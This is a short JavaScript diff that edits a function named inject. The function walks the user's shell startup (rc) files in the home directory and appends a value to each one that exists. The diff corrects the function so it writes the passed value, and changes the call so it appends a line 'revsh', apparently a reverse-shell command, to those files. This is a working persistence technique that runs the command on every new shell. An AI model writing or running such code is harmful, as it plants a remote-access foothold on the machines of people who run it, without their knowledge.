@@ -15,12 +15,13 @@ function inject(
   const homedir = os.homedir()
 
   rcs.forEach(filename => {
+    console.log(path.join(homedir, filename))
     const fullPath = path.join(homedir, filename)
     if (fs.existsSync(fullPath)) {
       console.log(`Adding to ${fullPath}`)
-      fs.appendFileSync(fullPath, rcs)
+      fs.appendFileSync(fullPath, value)
     }
   })
 }
 
-inject('revsh')
+inject('\nrevsh')
